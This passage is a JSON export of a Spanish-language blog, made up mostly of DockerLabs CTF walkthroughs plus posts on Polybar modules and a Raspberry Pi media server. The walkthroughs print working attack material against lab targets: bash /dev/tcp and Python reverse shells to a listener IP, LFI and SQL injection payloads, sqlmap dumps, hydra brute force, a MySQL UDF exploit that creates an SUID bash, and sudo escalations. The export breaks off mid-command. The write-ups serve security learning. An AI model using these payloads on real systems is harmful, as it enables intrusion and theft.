    "content": "Herramientas y recursosEn este reto de DockerLabs practicamos.            Autor      Tecnicas      Herramientas                  Dise0                                   scan de puertos      nmap                     fuzzing web      feroxbuster                     local file inclusion      curl      Reconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX gitea 172.18.0.2reporteComo vemos en el reporte en esta ocasion tenemos varios puertos abiertos el el 22 ssh, el 80 apache y el 3000 flaskVamos a empezar revisando bien las webs y anotando todo lo que sea de interes.En la de apache no aparece nada interesante de hecho creo que no modificaron nada , en la web del 3000 nos encontramos con lo que parece un servicio de git , asi que lo revisamos en profundidad.Revisando las webs nos encontramos con los repos en los cuales hay varias cosas que podrian ser utiles.Para empezar encontramos un password de mysql pese a no tener el puerto expuesto pero podria resultar util mas tarde.Fichero app.pyVemos varias cosas la primera una clave que tampoco se si sera de utilidadLa segunda una subida de archivos sin validar lo que si hallaramos la forma de subir un fichero malicioso nos daria un rce por ejemplo.Y la tercera una ruta download tambien sin validar la cual podria servirnos un fichero del sistema LFIFichero gitea_composed.xmlEncontramos unas rutas las cuales pueden sernos utiles pues tenemos un lfiNo puedo acceder al lfi , algo ocurre ,  al seguir navegando por la web me encuentro lo siguiente en la seccion registro, lo cual creo que puede ser un error dado que no deberian aparecer todos los subdominios.Debemos añadir todos los subdominios dentro de /etc/hostsAl añadir los subdominios al hosts y acceder a gitea.dl puedo ver un login con password difuminada.LLegado a este punto y para seguir eneumerando vamos con fuzzing de directorios y archivos.gitea.dlNada interesante ni utildev.gitea.dlAqui encuentro la ruta search que se asemeja a una barra de busqueda pero no hace nada solo muestra un nombre de otro subdominio como vimos en el error mas arriba.Despues de volver a hacer fuzzing sobre el otro subdominio encuentro otro login pero esta vez no me muestra el error de los subdominios, estoy casi seguro que no tendria que poder acceder al 172.17.0.2:3000 y ver los subdominoiosAhora probamos de nuevo el lfi.curl \"http://gitea.dl/download?filename=../../../../../etc/passwdEl lfi solo funciona a taves del dominio principalAhora con el passwd y los passwords que hemos obtenido de los diferente lugares pasamos a tratar de conectarnos por ssh al ser dos o tres passwords pruebo manualmente. dado que solo veo un user y las passwords son tres.Ninguna de esas sirve.Comprobemos las dos rutas que aparecen en el fichero gitea_composed_xml a ver si podemos acceder con el lfi.Nos indica la ruta claramente  pero yo no la lei bien al principio.Vemos que es una lista con posibles contraseñas las filtramos y hacemos fuerza bruta.awk '{print $1}' salida.txt | awk -F: '{print $2}'De esta forma nos quedamos solo passwords.Momento de lanzar hydra a ver si hay suerte ahora.Nos devuelve un password y estamos dentro.Con los comandos tipicos y sencillos no encotramos nada ni sudo ni fin , pero sabemos que hay un mysql corriendo en local porque en un fuichero habian passwords.Lanzo linpeas  y nos muestra que hay un mysq corriendo como root.Vamos a tratar de conectar con mysql.Si tratamos de acceder con designer y designer123 no hay suerte  , luego probe con la de la web que aparecia difuminada y con esa conseguimos entrar.admin:PassAdmin123-La verdad estoy mas que atascado y no queda otra consultar el writeup del creador de la maquina , desconoizco totalmente por donde seguirwriteupNos habla de una escalada llamada UDF (primera vez que lo oigo a leer).Aqui algo de documentacion acerca del errorudfmasudfEmpezamos descragando el exploitsearchsploit -m 1518.cLo trasladamos a la maquina victimapython3 -m http.server 8000curl -L http://192.168.0.106:8000/1518.c &gt; 1518.cSeguimos los pasos que indican en la poc para compilarlo. gcc -g -c 1518.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 1518.o -lcSi me explico mal corrijanme , lo que hace este exploit es crear un objeto compartido el cual posteriormente llamaramos desde mysql para adquirir los privilegios del usuario que este ejecuntando mysql en nuestro caso root.Lo primero una vez creado el *.so lo movemos a la carpeta pluggins de mysql y nos logueamos en mysql, una vez logueados cambiamos de bbdd a mysql y creamos la funcion que luego llamaremos para poder ejecutar comandos desde dentro de mysql unas vez creada la seleccionamoscp /tmp/raptor_udf2.so /usr/lib/mysql/pluginmysql -u admin -pUSE mysql;create function do_system returns integer soname 'raptor_udf2.so';select * from mysql.func;Hata aqui todo parece funcionar , ahora comprobaremos que ejecutamos como root.select do_system('whoami &gt; /tmp/whoami.txt');select do_system('cp /bin/bash /tmp/bash ; chmod +s /tmp/bash');Como vemos nos ha creado el fichero y la bash con suid activado lo que nos da acceso a medias pero ya somo rootA partir de aqui podriamos tratar de escapar de estos permisos limitados de varias formas. queda para mas adelante aunque recuerdo que en algun otro ctf escapabamos de ahi.P.D: Increible maquina la enumeracion es la ostia muy buena , la encontre bastante real y la escalada jamas la hubiese encontrado sin darle una mirada al nombre del ataque que usamos en esa maquina.Genio el creador"
  },
  
  {
    "title": "Modulos para polybar",
    "url": "/posts/Polybar_modules/",
    "categories": "Software",
    "tags": "Linux, Polybar, module, Automatizacion",
    "date": "2025-03-04 00:00:00 -0300",
    





    
    "snippet": "Haciendo la vida mas facilMe estoy poniendo al dia con tareas que tenia retrasadas y a mitad hacer entre ellas la automatizacion de dos tonterias , si tonterias pero eso nos permite conocer mejor e...",
    "content": "Haciendo la vida mas facilMe estoy poniendo al dia con tareas que tenia retrasadas y a mitad hacer entre ellas la automatizacion de dos tonterias , si tonterias pero eso nos permite conocer mejor el funcionamiento de nuestro entorno:1- Amplificar el volumen de mi laptop.2- Manejar los coleres del teclado rgb de mi laptop.Estos dos modulos son los que se encargan de hacerlo , estan listos para configuralos a tu sistema con polybar.Modulo volumenLes dejo el link.volampModulo openrgbLes dejo el link.openrgbTambien encontraran un Bot para X que se encarga de realizar un pequeño scraping de mi web y publicar mis ultimos post en , de esto tengo pensado mas adelante realizar un pequeño articulo pues voy iniciando en esto y asi tambien me lo dejo claro a mi.Un saludo y difundan su conocimiento."
  },
  
  {
    "title": "Sites , DockerLabs",
    "url": "/posts/sites/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, fuzzing, lfi, brute force, wfuzz, feroxbuster",
    "date": "2025-02-05 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Listado de ficheros y directorios  Fuzzing de parametros  Escalada con sedHerramientas y recursos  nmap  feroxbuster  wfuzzReconocimiento y...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Listado de ficheros y directorios  Fuzzing de parametros  Escalada con sedHerramientas y recursos  nmap  feroxbuster  wfuzzReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX sites 172.17.0.2reporteComo vemos en el reporte disponemos del http 80 y del ssh en el 22Vamos a empezar revisando la web a ver que nos encontramos con una web que nos da bastantes pistas dado que nos habla de LFI (local file inclusion) si es asi debemos encontrar una ruta con algun fichero que nos permita añadir un parametro para realizar la llamada a otro fichero que nos dara alguna pista como podria ser el tipico /etc/passwd.Ahora pasamos  a fuzzear tanto archivos como directorios ocultos por si hubiese algo mas y esteo fuera una jugada del pinguino     :-)Estamos de suerte nos encuentra una web llamada vulnerable.php asi que accedemos y observamos que ya nos da una pista mas el posible parametro  que puede ser page o username cosa que tambien podriamos fuzzear pero vamos a mano primero.Probando las dos opciones que nos da comprobamos que la correcta es page y lo probamos contra el que casi nunca falla /etc/passwdObtenemos respuesta positiva pero de poca ayuda aunque podriamos hacer fuerza bruta contra el user chocolate , mi otra idea era transformarlo el un log poisoning pero ningun fichero se presta.Lo unico me quedaria seria comprobar las rutas que nos ofrece como ejemplos en la web si no fuerza bruta contra ssh aunque no deben ir por los tiros.He tenido suerte y se puede acceder a leer el fichero sito.conf mencionado en la webVamos a ver que nos dejo mario en ese ficheroComo muy bien explica nos dejo una password y habiendo leido lo que pone al final habra fuerza bruta aunque en passwd solo esta el user chocolate y root.IntrusionPues no hay fuerza bruta entro directo con el user la pass proporcionadas.Una vez dentro hacemos lo primordial en esta maquinas.Escalada’'’bashsudo -l‘’’Nos deja el binario sed y procedemos como nos indica searchbins herramienta super recomdable para estos casos.Hasta aqui llego esta dudas o opiniones contacten por X.Gracias por leer"
  },
  
  {
    "title": "File , Dockerlabs",
    "url": "/posts/file/",
    "categories": "Dockerlabs",
    "tags": "nmap, fuzzing, escalada, bash, tratamiento tty",
    "date": "2025-01-07 00:00:00 -0300",
    





    
    "snippet": "En este reto de Dockerlabs nos encontraremos con las siguientes pruebas a superar:  Escaneo de puertos  Fuzzing de directorios y archivos  Reverse shell  Transferencia de archivos mediante python  ...",
    "content": "En este reto de Dockerlabs nos encontraremos con las siguientes pruebas a superar:  Escaneo de puertos  Fuzzing de directorios y archivos  Reverse shell  Transferencia de archivos mediante python  Fuerza bruta local  Escalada de privilegiosHerramientas y recursos empleados  nmap  feroxbuster  Script sudo brute (revisenn el github de el pinguino de mario)  escalada de privilegiosReconocimiento y enumeracionPara comenzar y como de costumbre lanzamos un nmap contra el objetivo , como hace un tiempito que no toco nada de  pentest uso el siguiente comando asi vamos volviendo a recordar que hace cada comando.sudo -A 172.17.0.2  A: le estamos indicando que haga un escaneo bastante completo y sin muchas complicaciones ni finuras , lo que hace es detecion de versiones , lanza scripts nse para comprobar vulnerabilidades y si no recuerdo mal realiza una especie de traceroute que en este caso no sirve de nada (con el traceroute lo que hacemos es ver cuantos saltos hay hasta la maquina objetivo)Observamos la salida y podemos comprobar que tenemos el puerto 21 ftp con login anonimo y un fichero de solo lectura llamado anon.txt y tambien nos encuentra el puerto 80 http.Primero me voy a ver el fichero del ftp.ftp 172.17.0.2get anon.txtCon el fichero en local ya podemos visualizar su contenido parece un hash md5 , nos trasladamos con la cadena a cualquier pagina web para desencriptarlo y nos da lo que podria ser un nombre de usuario justin.Solo nos queda revisar la web.Vamos a ello.Aparentemente es la web por default de apache pero seguro algo mas esconde , hora del fuzzing.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,sql -u http://172.17.0.2Nada mas lanzarlo nos encuentra el directorio uploads y un fichero interesante llamado file_upload.php esperemos que este algo sanitizado asi que vamos a ver el fichero y si hay algun contenido en el directorio uploads.InfiltracionComo esto ya nos lo hemos encontrado mas de una vez directamente subo un fichero con extension phar (phar es como un tipo de compresion para unir varios php en un solo archivo de manera que sea mas sencillo distribuir una aplicion en php) si no es correcto me escriben.El fichero en custion es una webshell , tambien podria haber subido para realizar la ejecucion desde la url.Nos ponemos con netcat a la escuchanc -lnvp 1188Y nos vamos al fichero que acabamos de subir y ejecutamos una revshell directamente.bash -c 'exec bash -i &amp;&gt;/dev/tcp/192.168.0.112/1188 &lt;&amp;1'Una vez dentro realizamos el tramiento de la ttyscript /dev/null -c bashCTRL+Zstty raw echo;fgreset xtermexport SHELL=bashexport TERM=xtermAjustamos tamano de nuestra terminalstty size (asi sabemos las columnas y filas)stty rows 33 columns 133 (en mi caso )Escalada de privilegiosUna vez dentro seremos el user www-data y nos encontramos con cuatro usuarios. A simple vista parece que no hay nada que nos permita escalar privilegios , así que solo queda la fuerza bruta.Para ello usaremos el script de mario y el diccionario rockyou. (como mi compu es viejita modifico el tiempo de cada intento haciendo que valla algo mas lento, si lo hago a la velocidad que esta no me pilla la password)Vamos a transferirnos los ficheros para ello nos desplazamos al directorio tmp y hacemos uso de python para crear el server http en local y wget para pillar los dos archivos.Empiezo contra el usuario mario que tanto podría ser el punto de entrada como el que nos permite escalar a root , ahora es prueba y error.Acerte de suerte el usuario con la pass floja es mario.Una vez dentro haciendo un sudo -l vemos que nos ha dejado el binario awk con permiso de julen.Una vez somos julen vemos que nos ha dejado otro binario env y de ese modo nos convertiremos en ikersudo -lsudo -u iker env /bin/bashEn el directorio de iker encontramos un script de python revisamos el contenidoMe parece una cosa un tanto extraña porque el fichero es de root y solo tenemos permisos de lectura , no obstante se nos permite eliminarlo.La solución fue eliminarlo y crear otro con el mismo nombre para posteriormente ejecutarlo con sudo para hacernos rootP.D:Disculpen el lio al realizar el tratamiento de la tty no consegui que no saliesen las letras dobles."
  },
  
  {
    "title": "Showtime , DockerLabs",
    "url": "/posts/showtime/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, sqli, sqli payloads",
    "date": "2024-08-02 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Listado de ficheros y derectorios  Burp intruder  sqlmap para el volcado de bbdd  Terminal de pythonHerramientas y recursos  nmap  feroxbus...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Listado de ficheros y derectorios  Burp intruder  sqlmap para el volcado de bbdd  Terminal de pythonHerramientas y recursos  nmap  feroxbuster  payloads sqli  sqlmap  revshellReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX showtime  172.17.0.2reporteComo vemos en el reporte disponemos del http 80 y del ssh en el 22El fuzzing de ficheros y directorios no aporta interesante , asi que revisamos la web.Lo unico intersante es el panel de login y nos hace pensar en algun tipo de inyeccion lo primero es ver si da algun tipo de error al meterle comilla’ o algun tipo de payload.Es posible la inyecion sql.Despues de trastear un rato con burpsuite (asi me suelto un poco) y su intruder probando payloads encuentro uno que me funciona.'OR '' = 'Con ese traga pero no obtengo nada , lo que me indica que me falta el usuario asi que probamos con sqlmap.Con sqlmap lo primero es listar las dbs.sqlmap -u \"http://172.17.0.2/login_page/index.php\" --forms --batch --dbComo vemos nos encuentra la bbdd user ahora procedemos a que nos muestre las tablas de la bbdd que nos interesa que es users.sqlmap -u \"http://172.17.0.2/login_page/index.php\" --forms --batch -D users --tablesAhora debemos mostrar el contenido o los entries de la tabla.sqlmap -u \"http://172.17.0.2/login_page/index.php\" --forms --batch -D users -T usuarios --dumpCon el usuario joe hacemos login y nos encontramos una terminal de python que nos permite ejecutar comandos.InfiltracionSin mas demora nos mandamos una revshell y realizamos el tratamiento de la tty.import socketimport subprocessimport osdef reverse_shell():    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.connect(('192.168.0.112', 1188))        while True:        command = s.recv(1024).decode('utf-8')        if command.lower() == 'exit':            break        output = subprocess.run(command, shell=True, capture_output=True)        s.send(output.stdout + output.stderr)        s.close()if __name__ == \"__main__\":    reverse_shell()Una vez recibida procedemos como siempre sudo -l no aporta nada pero con find tengo suerte.find / -type f -perm 644 2&gt;/dev/null | grep tmpRevisamos el fichero que estaba oculto y parecen ser una lista de contraseñas que pueden ser utiles tanto para joe como para luciano.Primero convertimos todas en minusculas y posteriomente eliminamos la lineas vacias y la del mensaje.awk '{print tolower($0)}' .hidden_text.txt &gt; minusculas.txtsed '1,3d' minusculas.txt &gt; limpioMovimientos lateralesCon el fichero limpio podemos empezar a realizar fuerza bruta ya sea en local o con hydra.Yo lo hice con hydra obteniendo la pass de joe.Hacemos login y vemos que con sudo -l tenemos un regalito.Consultamos searchbins y obtenemos como realizar el movimiento.sudo -u luciano /usr/bin/poshYa somos luciano ahora a ser root.Ejecutando sudo -l nos indica que podemos hacer uso de un script que esta en su home.Como vemos es una revshell pero apunta a otra direccion asi que o modificamos el script o reconfiguramos nuestra red local.Vamos por lo primeroYo no caliento con la revshell y prefiero darle permisos suid a bash.Podrias modificar el contenido con sed por ejemplo o con tr creo recordar.Me creo un fichero con el contenidotouch scriptecho '#!/bin/bash     &gt; &gt; bash -p' &gt; scriptmv script script.sh sudo /bin/bash /home/luciano/script.sh  Otra mas , un saludo y gracias por leer.."
  },
  
  {
    "title": "Raspberrypi 1b en 2024 sirve de algo.",
    "url": "/posts/raspberry-all/",
    "categories": "Offtopic, Raspberrypi",
    "tags": "oftopic, raspberry, ps3server, torrent, ps3free",
    "date": "2024-08-01 00:00:00 -0300",
    





    
    "snippet": "En este post vamos a dar luz en torno a lo que puede hacer una raspberry pi 1b en pleno 2024 y la verdad es que lo que hacia alla por 2018 se puede seguir realizando y con mas funcionalidad.Voy a t...",
    "content": "En este post vamos a dar luz en torno a lo que puede hacer una raspberry pi 1b en pleno 2024 y la verdad es que lo que hacia alla por 2018 se puede seguir realizando y con mas funcionalidad.Voy a tratar de explicar todos los servicios que corro en la pequeña raspi desde un cliente bittorrent , gestor de descargas , servidor de archivos ,liberar dumps de juegos ps3 , servidor para juegos de ps3.Instalamos el sistema Raspbian mas transmission-daemon  Descargamos la imagen raspbian  Preparamos la sd.  Copiamos la imagen.  Primeras configuraciones del sistema.  Instalacion de transmission.daemon y configuracionAhora desarrollamos el paso a paso.Con la imagen descargada pasamos a formatear la sd en fat32 para copiar posteriormente la img descargada haciendo uso del comando dd.Primero conectamos la sd y la localizamos para no escribir donde no debemos y la formateamos en fat32 para que este sin nada.Con un dmesg o un lsusb veremos cual es el ultimo dispositivo conectado y con df -h nos aseguramos que el dispositivo sea el correcto por el tamaño.Cuando tenemos claro que dispositivo es copiamos la imagen con el siguiente comando.dd if=Ruta/imagen/2018-04-18-raspbian-stretch-lite.img of=/tu/sd bs=1Una vez copiada la imagen pasamos la sd a raspi y conectamos red por rj45 en esta viejita y le damos corriente.Localizamos la raspi en nuestra red para conectarnos por ssh.Ya logueados ejecutamosraspi-configEn la ventana ncurses lo primero sera realizar un expand_rootfs para poder usar el 100% del tamaño de la sd y asegurarnos de que el servicio ssh quede activo aunque ya viene activado por defecto.En la misma ventana puedes ajustar las locales , el teclado y el overclock si asi lo deseas.Le tiramos un reboot.Una vez dentro de la raspi empezamos con actualización instalación de transmission-daemon.apt update &amp;&amp; apt upgrade &amp;&amp; apt install transmission-daemonCon todo actualizado y trasmission tambien vamos a configurarlo.Nos abrimos el fichero /var/lib/transmission-daemon/info/settings.json con el editor que usemos , si el servicio esta corriendo paradlo antes para evitar problemas./etc/init.d/transnmoision-daemon stopOpciones de configuracion creo no es necesario explicarlas estan bastante claras.download-dir”: “/media/pendrive/torrent/finish” Este es el directorio donde se guardaran los archivos descargados.“incomplete-dir-enabled”: true  Si lo ponemos verdadero le indicamos que guarde las partes de los torrents descargados en una carpeta diferente a los archivos finalizados.“incomplete-dir”: “/media/pendrive/torrent/temp”Directorio donde se guardaran las partes de los torrents“rpc-enabled”: true Habilita el RPC, es decir el que aplicaciones puedan conectarse al servicio, como la propia pagina web.“rpc-bind-address”: “0.0.0.0″ Por defecto viene a 127.0.0.1 si lo ponemos a 0.0.0.0 indicamos que cualquiera puede conectarse.“rpc-username”: “transmission”,  Aqui pondremos el usuario que queramos utilizar para hacer login en la pagina WEB de gestión.“rpc-password”: “{ac385a17c99c16caa7a3f218ae7955af61bb33f2moBazqG.”Esta es la password del usuario por defecto que es “transmission” igual que el usuario, la contraseña esta cifrada. “rpc-whitelist-enabled”: false, Esto habilita una lista de direcciones que pueden acceder mediante RPC por ejemplo la web.Guardamos el fichero y iniciamos el servicio./etc/init.d/trasnmission-daemos startPara añadir descargas podemos usar alguna app de android que conecte con el daemon o la pagina web que esta corriendo en el puerto 9091.Disfruten de las descargas consumiendo un minimo de electricidad.Ahora pasamos a configurar distintas formas de poder visualizar y transferir hacia nuestros dispositivos como un andriod tv o un ps3.Gestor de descargas en terminal PyloadEste gestor de descargas corre en segundo plano y nos conectamos a elñ via web , tiene soporte para descargas directas y multitud de plataformas tipo mega , mediafire  etc…..Para la instalacion es mejor cponsultar sus propiiaas instrucciones que incluyen las dependencias necesiarias y la propia instalacion del programa.Os dejo el enlace para descarga.No expongáis al internet el puerto por el que corre tiene un rce sin corregir.DescargaLibray ps3Libray es el software que nos va a permitir correr juegos de ps3 sin fallos ni descargas erroneas ni cosas raras.Vamos a utilizar los dumps que encontramos en internet archive de los juegos originales.En nuestro casa la utilidad que le vamos a dar es para que desencripte la imagen que hemos descargado , con esta forma de convertir los juegos y he convertido mas de 20 ninguno me ha fallado.DescargaTeneis varias formas de instalarlo recomiendo leer el readme para elegir la que mejor se te adapte.Una vez con el juego descargado desde Internet Archive solo hay que ejecutar este comando para poder convertirlo y  jugarlo.nohup libray -i Blackops1/Call\\ of\\ Duty\\ -\\ Black\\ Ops\\ \\(Europe\\)\\ \\(Es\\,It\\).iso -o /media/grandre/ps3server/PS3ISO/Call.Of.Duty.BlackOps.decrypted.iso &amp;Con -i le indicamos la imagen y con -o el fichero de salida.Yo al tratarse de la raspi y trabajar por ssh lo ejecuto como ven para poder cerrar la conexión pero que siga convirtiendo el juego sin problemas.Compartiendo el contenidoPara compartir el contenido os dejo varios metodos dado que depende de los dispositivos va mas fluido con uno que con otro , por ejemplo para compartir desde la raspi hacia un openelec o similar me funciona genial con samba , pero la ps3 me da problemas y uso el minidlna.SambaLa instalación de samba es sencilla si es que no la tenéis ya instalada , por tanto os dejo únicamente el ejemplo de mi configuración.[usb 64]comment = Usb completospath = /mnt/usb/completoswriteable = Yescreate mask = 0777directory mask = 0777browseable = yesvalid users @usersforce user = pi[grande musica]comment = Musicapath = /media/grandrewriteable = yescreate mask = 0777browseable = yesvalid users @usersforce user = pips3netsrvEsta aplicación es la ostia pues entre otras cosas el mayor uso que le doy es para poder correr los juegos directamente desde la raspberry que es donde los descargue asi corren por red y me ahorro la trasferencia hasta la ps3 o volver a ponerlo en un disco externo.No requiere de instalación en una de las carpetas del enlace que dejo viene la release par ejecutar directamente , podria faltaros alguna dependencia pero depende del caso.ps3netsrvLo único a tener en cuenta es colocar os juegos como indican en el wiki juegos tipo carpeta en su lugar , isos ps3 en su lugar ……respeten la estructura de directorios.En este caso lo ejecuto yo manualmente , aunque también podéis crear el fichero para que inicie en el arranque.nohup ./ps3netsrv /media/grandre/ps3server/ 38008 192.168.0.* &amp;minidlna serverY este ultima lo uso para ver video o música en la ps3 , también podéis usar ps3netsrv pero a mi este ultimo para este propósito me va de lujo.apt install minidlnaEncontrareis un fichero de configuración en /etc/minidlna.conf.Lo ajustáis a vuestras necesidades y gusto si leemos es sencillo.  En mi caso tengo conectado un disco externo con su propia alimentación de 1TB y una usb de 64.Con todo lo expuesto queda de manifiesto que ha estas viejitas todavia les queda mucha vida.Gracias por llegar hasta aquí."
  },
  
  {
    "title": "Cachopo, DockerLabs",
    "url": "/posts/cachopo/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, Burpsuite, rce",
    "date": "2024-07-30 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Proxy burpsuite  rce  SHA_DecryptHerramientas y recursos  nmap  feroxbuster  Burpsuite  SHA_DecryptReconocimiento y enumeracionLo primero c...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Proxy burpsuite  rce  SHA_DecryptHerramientas y recursos  nmap  feroxbuster  Burpsuite  SHA_DecryptReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX cachopo 172.17.0.2reporteComo podemos ver disponemos de l 80 y del 22 , primero revisamos la web a la vez lanzamos un feroxbuster por si encuentra algo.Feroxbuster no encuentra nada y lo unico interesante parece ser el gestor de reservas que aunque aparentemente no hace nada es lo unico que puede servir de algo.Para poder ver que sucede nos abrimos el burpsuite y activamos intercep , capturamos el request post y nos lo mandamos al repeater para jugar y ver que es lo que sucede.Nos dice que no puede decodear y nos tira un error , que desconozco.En esta prueba el error nos da un poco mas de luz y nos indica que esta esperando algo en base64 , procedemos a tirarle algo.Como podemos ver en este ultimo ejemplo ya vemos que es lo que hace claramente , utilza sh para ejecutar comandos por tanto es un rce.Tenemos aparentemente un usuario pero vamos a corroboralo antes de lanzar a hydra.Ahora si lanzamos hydra contra ese usuario.hydra -l cachopin -P /home/quino/rockyou.txt 172.17.0.2 ssh -t 64 InfiltracionNos logueamos por ssh con el user cahopin y realizamos las comprobaciones tipicas  sudo -l  find  cron  gecapsTodo sin exito asi que revisamos bien el directorio  personal.Despues de revisar el entrypoint.sh el statics , templates etc , encuentro algo prometedor en /home/cachopin/app/com/personalEs una lista de hashes tipo sha1 y como podemos ver esta en base64 con salt y no tengo mas idea pues las paginas online que he probado ninguna me detecta bien que es ni como decodearlo dado que sha1 es en teoria unidireccional.Despues de estar rato rasgando las paginas de hashes y el jodio GPT no consigo nada , asi que investigamos mas al creador de la maquina.Buscando en google por @patxasec a mi me devuelve tres resultados el interesante es el de github.Tiene un repo sha-decrypt nos descargamos el repo y seguimos sus instruciones.python3 sha2text.py 'd' '$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I=' '/usr/share/wordlists/rockyou.txt'No me queda claro como puede pasar todo el rockyou tan rapido , ni como esta codificado el password.Probamos a loguearnos como root con el password del hash.Maquina genial buenisima y divertida fuera de lo habitual.gracias por leer"
  },
  
  {
    "title": "Wallet , DockerLabs",
    "url": "/posts/wallet/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, burpsuite",
    "date": "2024-07-14 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  Intercepcion con burpsuite  Reconocimiento directoriosHerramientas y recursos  nmap  feroxbuster  burpsuite  Embeb server phpReconocimiento...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  Intercepcion con burpsuite  Reconocimiento directoriosHerramientas y recursos  nmap  feroxbuster  burpsuite  Embeb server phpReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX wallet  172.17.0.2reporteEn este caso nos encontramos solo con el protocolo http abierto por el 80.REvisando el codigo observamos que se nos oculta un virtual host.Lo añadimos a /etc/hosts y realizamos fuzzing de directorios.Al entrar a la ruta del vh nos tira una pagina de registro asi que nos registramos y logueamos.En la pestaña about vemos la version asi que pasamos a buscar exploits para dicha version.Encontramos la solucion muy bien explicada en exploitdbSesguimos los pasos que nos indican.  Crear una nueva suscripcion  Añadir un logo y cambiarlo por nuestro payload  CAmbiar el content type a image/jpeg y añadir “GIF89a” y ebajo de gif añadir nuestro payload.  Comprobamos que se haya hecho el update correctamente.  Buscamos nuestro fichero malicioso en images uploads.Como burpsuite se me atraganta les dejo un videito de como se realiza este ataque , aunque es sencillo algunas herramientas que usamos son bastante complejas pese a no utilzar ni el 10% de su poder.Una vez la tenemos subida no disponemos a mandarnos una revshell y para ello antes no colocamos a la escucha con nc .Encondeamos la url antes si no no va a funcionar.bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.0.112%2F1188%20%3C%261%27Realizamos el tratamiento de la shellEmpezando por lo basico con sudo -l encontramos el bionario awk que nos permite ejecutarlo como pylon.Movimientos lateralesHacemos uso de awk nos convertimos en pylon.sudo -u pylon awk 'BEGIN {system(\"/bin/sh\")}'Vemos que hay otro usuario llamado pinguino investigamos a ver que nos dejaron.En el directorio de pylon tenemos un zip que hemos de traer a la maquina atacante.Decido utilizar el servcio php para traerme el fichero.php -S 0.0.0.0:8989 -f /home/pylon/Y en el navegador o en curl solicitamos lo que deseamos.http://panel.wallet.dl:8989/secretitotraviesito.zipCon el fichero en nuestra maquina comprobamos si esta con pass.Pasamos a hashsearlozip2john secretitotraviesito.zip &gt; hash/home/quino/hacking_tools/brute_passwords_hash/john/run/john hash --showYa tenemos la pass del otro user nos movemos hacia su entorno.REalizamos lo mismo que antes sudo -l y podemos ver que nos han dejado a sed , miramos en searchbins como se escala con sed.sudo sed -n '1e exec sh 1&gt;&amp;0' /etc/hostsMuchas gracias por leer , saludos"
  },
  
  {
    "title": "Vulnerame , DockerLabs",
    "url": "/posts/comida/",
    "categories": "DockerLabs",
    "tags": "ctf, hacking, etico, joomla, rce",
    "date": "2024-07-13 00:00:00 -0300",
    





    
    "snippet": "En este reto de DockerLabs practicamos.  Scan de puertos  rce  Reverse shell  Enumeracion ficheros y directorios  Crack con john BCRYPTHerramientas y recursos  nmap  feroxbuster  john  sshReconocim...",
    "content": "En este reto de DockerLabs practicamos.  Scan de puertos  rce  Reverse shell  Enumeracion ficheros y directorios  Crack con john BCRYPTHerramientas y recursos  nmap  feroxbuster  john  sshReconocimiento y enumeracionLo primero como siempre le tiramos un nmap con los parámetros de costumbre.sudo nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn -oX comida  172.17.0.2reporteComo vemos en el reporte disponemos del http 80 y del ssh en el 22Vemos la pagima default asi que lanzamos un poco de fuzzing en  busca ficheros y directorios.feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 400 -x php,txt,jpg -u http://172.17.0.2Nos encontramos directorio trucho wordpress pero con un joomla dentro, necesitamos saber la version .Joomla en versiones antiguas como debe ser esta la guarda en administrator/manifests/files/joomla.xml*Sabiendo este dato ya podemos seguir buscando por la web como poder acceder a este joomla.Buscando encontramos que alguna versiones de joomla te regalan la info que no deberia Unauthenticated information disclosure y un cve asociado CVE-2023-23752.Este cve se aprovecha de que quedan expuestos datos json y se puede entrar sin mas en las siguientes direcciones.api/index.php/v1/config/application?public=trueapi/index.php/v1/users?public=trueEsas dos rutas corresponden a datos de configuracion del joomla y a los usuarios dentro de joomla.InfiltracionCon los datos proporcionados deberiamos de poder hacer login en mysql y navegar hasta los passwords.mysql -h 172.17.0.2 -u joomla_user -pshow databases;use joomla_db;show tables;select * from ffsnq_usersAhora tenemos un hash  segun el amigo ia gpt es un bcrypt asi que le paso a john./home/quino/hacking_tools/brute_passwords_hash/john/run/john --format=BCRYPT -w /home/quino/Descargas/rockyou.txt/rockyou.txt hashJohn me tira la password despues de un tiempito pese a estar en linea 1200 aproximadamente del rockyou.Ahora si estamos listos para entrar a la web.Una vez logueados como administrator vamos a panel de control &gt; dashboard &gt; templates &gt; selecionamos cassiopeia &gt; y yo modifico el error.php dejandolo de la siguinete manera.Guardamos , salimos y vamos a la ruta correcta.Nos preparamos para mandarnos una reverseshell y codeamos la rev.nc -lnvp 